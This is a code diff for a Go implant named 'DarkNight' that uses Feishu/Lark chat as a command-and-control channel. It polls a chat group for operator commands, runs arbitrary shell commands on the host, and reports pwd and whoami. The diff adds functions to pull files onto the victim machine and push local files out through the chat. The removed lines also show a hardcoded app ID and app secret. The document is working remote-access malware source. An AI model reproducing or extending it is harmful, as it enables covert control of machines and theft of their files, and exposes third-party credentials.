@@ -2,13 +2,17 @@ package main
 
 import (
 	"bytes"
+	"context"
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
+	lark "github.com/larksuite/oapi-sdk-go/v3"
+	larkim "github.com/larksuite/oapi-sdk-go/v3/service/im/v1"
 	"io/ioutil"
 	"net/http"
 	"os"
 	"os/exec"
+	"path/filepath"
 	"regexp"
 	"runtime"
 	"strings"
@@ -198,8 +202,8 @@ func get_chat_group(tenant_access_token string) (string, error) {
 
 }
 
-func get_last_history_message(tenant_access_token string, chat_id string) (string, string, string, error) {
-	url := fmt.Sprintf("https://open.feishu.cn/open-apis/im/v1/messages?container_id=%s&container_id_type=chat&sort_type=ByCreateTimeDesc&page_size=1", chat_id)
+func get_last_history_message(tenant_access_token string, chat_id string, pianyi int) (string, string, string, string, error) {
+	url := fmt.Sprintf("https://open.feishu.cn/open-apis/im/v1/messages?container_id=%s&container_id_type=chat&sort_type=ByCreateTimeDesc&page_size=3", chat_id)
 	// 创建HTTP请求
 	req, _ := http.NewRequest("GET", url, nil)
 	// 设置请求头，指定内容类型为JSON
@@ -209,7 +213,7 @@ func get_last_history_message(tenant_access_token string, chat_id string) (strin
 	client := &http.Client{}
 	resp, err := client.Do(req)
 	if err != nil {
-		return "", "", "", fmt.Errorf("Error sending request: %s\n", err)
+		return "", "", "", "", fmt.Errorf("Error sending request: %s\n", err)
 	}
 	defer resp.Body.Close()
 	// 读取响应体
@@ -221,12 +225,14 @@ func get_last_history_message(tenant_access_token string, chat_id string) (strin
 	// 截取最后一条消息
 	items := responseBody.Data.Items
 	//fmt.Println(items)
-	len := len(items)
-	body_content := items[len-1].Body.Content
-	msg_type := items[len-1].MsgType
-	sender_type := items[len-1].Sender.SenderType
+	//len := len(items)
+	//减1表示获取倒数第一条消息，减2表示获取倒数第二条消息；
+	body_content := items[pianyi].Body.Content
+	msg_type := items[pianyi].MsgType
+	sender_type := items[pianyi].Sender.SenderType
+	message_id := items[pianyi].MessageId
 
-	return body_content, msg_type, sender_type, nil
+	return body_content, msg_type, sender_type, message_id, nil
 }
 
 func bot_send_text_message(tenant_access_token string, chat_id string, message_text string) (string, error) {
@@ -274,14 +280,119 @@ func bot_send_text_message(tenant_access_token string, chat_id string, message_t
 	return msg, nil
 }
 
+func first_upload_then_download_file_to_implant_path(tenant_access_token string, chat_id string, filename_to_save string) error {
+	//首先要获取该条消息前一条上传的文件的file_key。
+	body_content, msg_type, _, message_id, _ := get_last_history_message(tenant_access_token, chat_id, 1)
+	if msg_type != "file" {
+		return fmt.Errorf("failed")
+	}
+	// 编译正则表达式
+	re := regexp.MustCompile(`"file_key":"(.*?)","file_name":".*?"`)
+	// 使用正则表达式查找匹配项
+	file_key := re.FindStringSubmatch(body_content)[1]
+	//fmt.Println("now command is: ", real_content)
+	download_url := fmt.Sprintf("https://open.feishu.cn/open-apis/im/v1/messages/%s/resources/%s?type=file", message_id, file_key)
+	// 创建HTTP请求
+	req, _ := http.NewRequest("GET", download_url, nil)
+	// 设置请求头，指定内容类型为JSON
+	req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", tenant_access_token))
+
+	// 发送请求
+	client := &http.Client{}
+	resp, err := client.Do(req)
+	if err != nil {
+		return fmt.Errorf("Error sending request: %s\n", err)
+	}
+	defer resp.Body.Close()
+	// 读取响应体
+	body, _ := ioutil.ReadAll(resp.Body)
+	//fmt.Println(string(body))
+
+	//将文件保存到本地
+	// 保存到当前目录
+	localFileName := filepath.Base(filename_to_save)
+	if err := ioutil.WriteFile(localFileName, body, 0644); err != nil {
+		return fmt.Errorf("write file error: %v", err)
+	}
+
+	return nil
+}
+
+func bot_send_file_message(chat_id string, file_key string) error {
+	// 创建 Client
+	client := lark.NewClient(app_id, app_secret)
+	// 创建请求对象
+	req := larkim.NewCreateMessageReqBuilder().
+		ReceiveIdType(`chat_id`).
+		Body(larkim.NewCreateMessageReqBodyBuilder().
+			ReceiveId(chat_id).
+			MsgType(`file`).
+			Content(fmt.Sprintf(`{"file_key":"%s"}`, file_key)).
+			Build()).
+		Build()
+	// 发起请求
+	_, err := client.Im.Message.Create(context.Background(), req)
+	// 处理错误
+	if err != nil {
+		return fmt.Errorf("failed")
+	}
+
+	return nil
+}
+
+func download_implant_file_to_local(tenant_access_token string, chat_id string, implant_file_path_to_download string) error {
+	// 创建 Client
+	client := lark.NewClient(app_id, app_secret)
+	file, err := os.Open(implant_file_path_to_download)
+	if err != nil {
+		return fmt.Errorf("failed")
+	}
+	defer file.Close()
+	// 创建请求对象
+	req := larkim.NewCreateFileReqBuilder().
+		Body(larkim.NewCreateFileReqBodyBuilder().
+			FileType(`stream`).
+			FileName(implant_file_path_to_download).
+			File(file).
+			Build()).
+		Build()
+	// 发起请求
+	resp, err := client.Im.File.Create(context.Background(), req)
+	// 处理错误
+	if err != nil {
+		return fmt.Errorf("failed")
+	}
+	file_key := resp.Data.FileKey
+	fmt.Println("upload file_key is:", *file_key)
+	if err := bot_send_file_message(chat_id, *file_key); err != nil {
+		return fmt.Errorf("failed")
+	}
+	return nil
+}
+
+func printHelp() string {
+	return fmt.Sprintf("Welcome to the DarkNight!\n" +
+		" - start : start the feishu-implant\n" +
+		" - help : show this help menu\n" +
+		" - pwd : print working directory\n" +
+		" - whoami : get username\n" +
+		" - cmd <command> : execute command\n" +
+		" - upload <remote_file_name> : upload local file to the feishu-implant if your previous message is file\n" +
+		" - download <remote_file_name> : download remote_file of feishu-implant to current local feishu\n" +
+		" - exit : kill the connection with the feishu-implant")
+}
+
+var app_id string
+var app_secret string
+
 func main() {
 	fmt.Println("Welcome to the DarkNight")
-	//if len(os.Args) < 3 {
-	//	fmt.Println("Usage: implant <app_id> <app_secret>")
-	//	return
-	//}
-	app_id := "cli_a79a4d7707f8500d"
-	app_secret := "QbaercW9AEznAj0BkhBGweqPgaCdj2bT"
+	if len(os.Args) < 3 {
+		fmt.Println("Usage: implant <app_id> <app_secret>")
+		return
+	}
+	app_id = os.Args[1]
+	app_secret = os.Args[2]
 
 	tenant_access_token, err := get_tenant_access_token(app_id, app_secret)
 	if err != nil {
@@ -299,23 +410,25 @@ func main() {
 
 	for {
 		// 检测当前最后一条历史消息是否为start启动命令
-		body_content, _, _, _ := get_last_history_message(tenant_access_token, chat_id)
+		body_content, _, _, _, _ := get_last_history_message(tenant_access_token, chat_id, 0)
 		// 编译正则表达式
 		re := regexp.MustCompile(`"[^"]*":"(.*?)"`)
 		// 使用正则表达式查找匹配项
 		real_content := re.FindStringSubmatch(body_content)[1]
+		//fmt.Println(real_content)
 		if real_content == "start" {
 			if _, err := bot_send_text_message(tenant_access_token, chat_id, " [*] my friend, i am ready, rush now!!!"); err != nil {
 				fmt.Println(" [-] start failed, please check your chat_group!")
 			}
 			fmt.Println(" [+] implant is already in place!")
 			for {
-				body_content, _, _, _ := get_last_history_message(tenant_access_token, chat_id)
+				body_content, _, _, _, _ := get_last_history_message(tenant_access_token, chat_id, 0)
 				// 编译正则表达式
-				re := regexp.MustCompile(`"[^"]*":"(.*?)"`)
+				re := regexp.MustCompile(`"[^"]*":"(.*?)".*?`)
 				// 使用正则表达式查找匹配项
 				real_content := re.FindStringSubmatch(body_content)[1]
 				//fmt.Println("now command is: ", real_content)
+
 				if real_content == "exit" {
 					if _, err := bot_send_text_message(tenant_access_token, chat_id, " [*] goodbye my friend, see you next time!!!"); err != nil {
 						fmt.Println(" [-] exit failed, please check your chat_group!")
@@ -323,22 +436,38 @@ func main() {
 					break
 				}
 				if real_content == "pwd" {
-					result := fmt.Sprintf(" [+] `%s` Result: %s", real_content, pwd())
+					result := fmt.Sprintf(" [+] `%s` Result:\n%s", real_content, pwd())
 					bot_send_text_message(tenant_access_token, chat_id, result)
 				}
 				if real_content == "whoami" {
-					result := fmt.Sprintf(" [+] `%s` Result: %s", real_content, whoami())
+					result := fmt.Sprintf(" [+] `%s` Result:\n%s", real_content, whoami())
 					bot_send_text_message(tenant_access_token, chat_id, result)
 				}
-				if strings.HasPrefix(real_content, "shell") {
-					command := strings.TrimPrefix(real_content, "shell ")
-					result := fmt.Sprintf(" [+] `%s` Result: %s", command, shell(command))
+				if strings.HasPrefix(real_content, "cmd") {
+					command := strings.TrimPrefix(real_content, "cmd ")
+					result := fmt.Sprintf(" [+] `%s` Result:\n%s", command, shell(command))
 					bot_send_text_message(tenant_access_token, chat_id, result)
 				}
 				if strings.HasPrefix(real_content, "upload") {
-
+					args := strings.Fields(real_content)
+					file_name_to_save := args[1]
+					err := first_upload_then_download_file_to_implant_path(tenant_access_token, chat_id, file_name_to_save)
+					if err != nil {
+						bot_send_text_message(tenant_access_token, chat_id, fmt.Sprintf(" [-] upload %s failed, please check previous message is the file that needs to be uploaded!!!", args[1]))
+						continue
+					}
+					bot_send_text_message(tenant_access_token, chat_id, fmt.Sprintf(" [+] upload %s to the current path of implant success!", args[1]))
 				}
 				if strings.HasPrefix(real_content, "download") {
+					//需要先向平台上传文件获取file_key，然后才能以发送消息的方式发送文件到群组。
+					args := strings.Fields(real_content)
+					path_to_download := args[1]
+					err := download_implant_file_to_local(tenant_access_token, chat_id, path_to_download)
+					if err != nil {
+						bot_send_text_message(tenant_access_token, chat_id, fmt.Sprintf(" [-] download %s failed, please check the path of implant is right!!!", args[1]))
+						continue
+					}
+					bot_send_text_message(tenant_access_token, chat_id, fmt.Sprintf(" [+] download %s success!", args[1]))
 
 				}
 
@@ -346,6 +475,11 @@ func main() {
 				fmt.Println("waiting for the master enter command...")
 			}
 			break
+		} else if real_content == "help" {
+			if _, err := bot_send_text_message(tenant_access_token, chat_id, printHelp()); err != nil {
+				fmt.Println(" [-] start failed, please check your chat_group!")
+			}
+			continue
 		} else {
 			time.Sleep(3 * time.Second)
 			fmt.Println("waiting for the start signal...")
